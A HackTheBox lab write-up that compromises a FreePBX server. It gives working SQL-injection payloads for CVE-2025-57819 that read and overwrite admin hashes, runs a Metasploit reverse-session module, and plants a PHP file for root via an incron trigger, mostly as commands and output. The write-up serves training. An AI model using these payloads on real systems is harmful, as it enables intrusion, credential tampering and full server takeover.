# HTB — Connected

**IP:** `<TARGET>`
**Domain:** `connected.htb`
**OS:** Linux (CentOS)
**Platform:** HackTheBox — Easy
**Tech Stack:** FreePBX, Asterisk, Apache/PHP, MySQL, incrond

---

## Attack Chain Overview

```
Nmap → FreePBX on 80/443
  → CVE-2025-57819: Unauthenticated SQLi in EPM brand parameter
  → EXTRACTVALUE error-based: read admin SHA1 hash in 20-char chunks
  → Stacked query UPDATE/INSERT ampusers → admin access
  → Metasploit freepbx_unauth_sqli_to_rce → shell as asterisk
  → incrond: ha_trigger world-writable → sysadmin_ha runs as root
  → freepbx_ha module not installed, modules dir writable by asterisk
  → PHP module hijacking → SUID bash → ROOT
```

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Vulnerability Discovery — CVE-2025-57819](#2-vulnerability-discovery--cve-2025-57819)
3. [Credential Extraction via Error-Based SQLi](#3-credential-extraction-via-error-based-sqli)
4. [Admin Access via SQLi Write](#4-admin-access-via-sqli-write)
5. [Initial Access — Metasploit RCE](#5-initial-access--metasploit-rce)
6. [Privilege Escalation — incron + PHP Module Hijacking](#6-privilege-escalation--incron--php-module-hijacking)
7. [Root Flag](#7-root-flag)
8. [Credentials](#8-credentials)
9. [Key Takeaways](#9-key-takeaways)
10. [Related Notes](#10-related-notes)

---

## 1. Reconnaissance

```bash
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN allports
nmap -sVC -p22,80,443 $TARGET -oN service
```

**Output**
```
22/tcp  open  ssh    OpenSSH 7.4
80/tcp  open  http   Apache/2.4.6 (CentOS) PHP/7.4.16
443/tcp open  https  Apache/2.4.6 (CentOS) PHP/7.4.16
```

Both ports 80 and 443 expose a **FreePBX** web interface — the management frontend for the
Asterisk PBX platform. Add the domain to `/etc/hosts`:

```bash
echo "$TARGET connected.htb" >> /etc/hosts
```

---

## 2. Vulnerability Discovery — CVE-2025-57819

The FreePBX **Endpoint Manager (EPM)** module exposes an AJAX endpoint at
`/admin/ajax.php`. The `brand` parameter is not sanitised, allowing unauthenticated
error-based SQL injection:

```bash
curl -ik "http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+database())))--+-"
```

**Response confirms SQLi:**
```json
{"error":{"message":"XPATH syntax error: '~asterisk'"}}
```

The current database is `asterisk`. This is **CVE-2025-57819** — unauthenticated
error-based injection that allows full DB read and write.

---

## 3. Credential Extraction via Error-Based SQLi

The `ampusers` table stores admin credentials as SHA1 hashes in `password_sha1`.
`EXTRACTVALUE` truncates output at 32 chars, so a 40-char SHA1 hash must be extracted
in two chunks using `SUBSTRING`:

```bash
# First 20 chars (offset 1)
curl -ik "http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+SUBSTRING(password_sha1,1,20)+FROM+ampusers+WHERE+username='admin')))--+-"
# → 05c689686a4fad5ce3ec

# Last 20 chars (offset 21)
curl -ik "http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+SUBSTRING(password_sha1,21,20)+FROM+ampusers+WHERE+username='admin')))--+-"
# → 76e7ae5708b1fe2da43a

# Reconstructed admin SHA1:
# 05c689686a4fad5ce3ec76e7ae5708b1fe2da43a
```

The hash was not found in rockyou.txt. Since we have write access, it is faster to
overwrite the hash with a known password rather than crack it.

---

## 4. Admin Access via SQLi Write

Generate the SHA1 of a known password and update the admin row:

```bash
echo -n "admin123" | sha1sum
# → f865b53623b121fd34ee5426c792e5c33af8c227

# Update the existing admin user via stacked query
curl -ik "http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x';UPDATE+ampusers+SET+password_sha1='f865b53623b121fd34ee5426c792e5c33af8c227'+WHERE+username='admin';--+-"
```

Alternatively, insert a new admin user if the UPDATE fails:

```bash
# Verify current row count
curl -ik "..&brand=x'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+COUNT(*)+FROM+ampusers)))--+-"
# → ~2

curl -ik "..&brand=x';INSERT+INTO+ampusers+(username,password_sha1,extension_low,extension_high,deptname,sections)+VALUES('hacker','f865b53623b121fd34ee5426c792e5c33af8c227','0','999','','*');--+-"

# Confirm row count went from 2 → 3
```

Log into `http://connected.htb/admin` with `admin:admin123`.

---

## 5. Initial Access — Metasploit RCE

With admin credentials the Metasploit module can authenticate and achieve RCE:

```bash
msfconsole -q
use exploit/unix/http/freepbx_unauth_sqli_to_rce
set RHOSTS connected.htb
set LHOST tun0
set LPORT 4444
run
```

Meterpreter session as `asterisk`:

```bash
[asterisk@connected ~]$ id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
[asterisk@connected ~]$ cat user.txt
<user_flag>
```

Also of note — credentials in `/etc/freepbx.conf`:

```bash
cat /etc/freepbx.conf
# freepbxuser / mZzDpAGKTmPJ
```

---

## 6. Privilege Escalation — incron + PHP Module Hijacking

### Enumeration

```bash
find / -perm -4000 2>/dev/null     # SUID binaries (pkexec, incrontab present)
getcap -r / 2>/dev/null            # suexec = cap_setuid+ep
cat /etc/incron.d/*
```

**incron rules:**
```
/usr/local/asterisk/ha_trigger  IN_CLOSE_WRITE  /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron      IN_CLOSE_WRITE  /usr/bin/sysadmin_manager --local $#
/var/spool/asterisk/incron      IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

`ha_trigger` is world-writable and writing to it triggers `sysadmin_ha` **as root**:

```bash
ls -la /usr/local/asterisk/ha_trigger
# -rwxrwxrwx. 1 asterisk asterisk 0 Apr 15 2021 ha_trigger
```

### Analysing sysadmin_ha

```php
#!/usr/bin/php -q
<?php
if (file_exists("/var/www/html/admin/modules/freepbx_ha/license.php")) {
    include_once("/var/www/html/admin/modules/freepbx_ha/license.php");
}

$i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
if (file_exists($i)) {
    require_once($i);
    $incron = new incron;
    $incron->rootTrigger();   // ← runs as ROOT
}
```

The `freepbx_ha` module was not installed, but `/var/www/html/admin/modules/` is
writable by `asterisk`. This allows **PHP module hijacking**.

### Exploitation

```bash
# 1. Create the fake module structure
mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc

# 2. Drop a malicious incron.php implementing the expected class
cat > /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php << 'PHP'
<?php
class incron {
    public function rootTrigger() {
        system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
    }
}
PHP

# 3. Trigger the incrond chain
echo "pwn" > /usr/local/asterisk/ha_trigger

# 4. Wait a moment and execute the SUID bash
sleep 3 && /tmp/rootbash -p
```

```
whoami
# root
```

---

## 7. Root Flag

```bash
cat /root/root.txt
# <root_flag>
```

---

## 8. Credentials

| Username     | Password      | Source                        |
|--------------|---------------|-------------------------------|
| admin        | admin123      | SHA1 overwritten via SQLi     |
| freepbxuser  | mZzDpAGKTmPJ  | /etc/freepbx.conf             |

---

## 9. Key Takeaways

1. **Unauthenticated SQLi does not require a login to cause full compromise.** The EPM
   `brand` parameter was reachable without authentication, giving read and write access
   to the entire `asterisk` database — including admin credentials.

2. **EXTRACTVALUE truncates at 32 chars — use SUBSTRING to extract long values.**
   SHA1 hashes are 40 hex chars; pulling them in two 20-char chunks with `SUBSTRING(col,
   offset, 20)` is the reliable workaround.

3. **SQLi write == authentication bypass.** `UPDATE ampusers SET password_sha1=...` or
   inserting a new admin row is faster than cracking an unknown hash and achieves the
   same escalation to admin access.

4. **incron + world-writable trigger == privesc waiting to happen.** Any file-monitoring
   daemon (`incrond`, inotify hooks) that executes a privileged script when a
   world-writable file changes is a direct path to root.

5. **Dynamic PHP `require_once` from a user-writable path == module hijacking.** If a
   root-level script loads a PHP class from a path the low-privilege user can write to,
   the entire class hierarchy is attacker-controlled.

---

## 10. Related Notes

- [`../../tools/recon/nmap.md`](../../tools/recon/nmap.md)
- [`../../tools/exploitation/metasploit.md`](../../tools/exploitation/metasploit.md)
- [`../../exploits/web-disclosure/freepbx-extractvalue-sqli.md`](../../exploits/web-disclosure/freepbx-extractvalue-sqli.md)
- [`../../privesc/linux/incron-module-hijacking.md`](../../privesc/linux/incron-module-hijacking.md)